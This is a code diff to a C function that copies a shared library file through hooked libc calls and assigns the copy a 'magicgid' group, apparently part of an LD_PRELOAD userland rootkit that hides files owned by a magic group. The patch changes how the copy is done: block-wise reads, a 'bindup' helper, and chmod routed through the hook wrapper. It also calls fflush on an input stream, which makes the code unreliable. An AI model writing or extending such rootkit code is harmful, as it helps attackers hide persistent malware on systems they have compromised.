@@ -44,50 +44,43 @@ char *sogetpath(char *sopath){
 }
 
 int socopy(const char *opath, char *npath, gid_t magicgid){
-    struct stat sostat;
     unsigned char *buf;
     FILE *ofp, *nfp;
-    size_t n, m, filesize;
+    size_t n, m;
     mode_t somode;
+    off_t fsize, blksize;
 
-    hook(CFOPEN, CFWRITE, C__XSTAT);
+    hook(CFOPEN, CFWRITE, CCHMOD);
 
-    memset(&sostat, 0, sizeof(struct stat));
-    if((long)call(C__XSTAT, _STAT_VER, opath, &sostat) < 0)
-        return -1;
+    ofp = bindup(opath, npath, &nfp, &fsize, &somode);
+    if(ofp == NULL) return -1;
 
-    filesize = sostat.st_size;
-    somode = sostat.st_mode;
+    //nfp = call(CFOPEN, npath, "wb");
+    //if(nfp == NULL){
+    //    fclose(ofp);
+    //    return -1;
+    //}
 
-    ofp = call(CFOPEN, opath, "rb");
-    if(ofp == NULL)
-        return -1;
-
-    nfp = call(CFOPEN, npath, "wb");
-    if(nfp == NULL){
-        fclose(ofp);
-        return -1;
-    }
-
-    buf = malloc(filesize+1);
-    memset(buf, 0, filesize+1);
-
+    blksize = getablocksize(fsize);
     do{
-        n = fread(buf, 1, filesize, ofp);
-        if(n)
+        buf = malloc(blksize+1);
+        memset(buf, 0, blksize+1);
+        n = fread(buf, 1, blksize, ofp);
+        if(n){
             m = (long)call(CFWRITE, buf, 1, n, nfp);
-        else
-            m = 0;
+            fflush(nfp);
+        }else m = 0;
+        fflush(ofp);
+        free(buf);
     }while(n > 0 && n == m);
 
-    free(buf);
     fclose(ofp);
     fclose(nfp);
 
     if(chown_path(npath, magicgid) < 0)
         return -1;
 
-    if(chmod(npath, somode) < 0)
+    if((long)call(CCHMOD, npath, somode) < 0)
         return -1;
 
     return 1;
